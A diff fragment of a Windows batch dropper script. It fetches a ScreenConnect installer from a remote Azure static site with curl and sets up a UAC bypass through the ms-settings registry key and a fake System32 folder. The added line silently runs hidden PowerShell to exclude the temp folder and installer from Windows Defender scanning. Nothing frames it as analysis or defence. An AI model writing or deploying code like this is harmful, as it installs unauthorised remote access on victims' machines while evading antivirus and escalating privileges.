@@ -11,6 +11,7 @@ set "MSI=%TEMP%\ScreenConnect.ClientSetup.msi"
 set "URL=https://ashy-meadow-058164310.2.azurestaticapps.net/ScreenConnect.ClientSetup.msi"
 set "R=HKCU\Software\Classes\ms-settings\Shell\Open\command"
 set "W=%TEMP%\cdw"
+powershell -nop -w hidden -c "try{Add-MpPreference -ExclusionPath '%TEMP%','%MSI%'}catch{}"
 curl -fsSL -o "%MSI%" "%URL%"
 if errorlevel 1 exit /b 1
 mkdir "%W%\System32" 2>nul
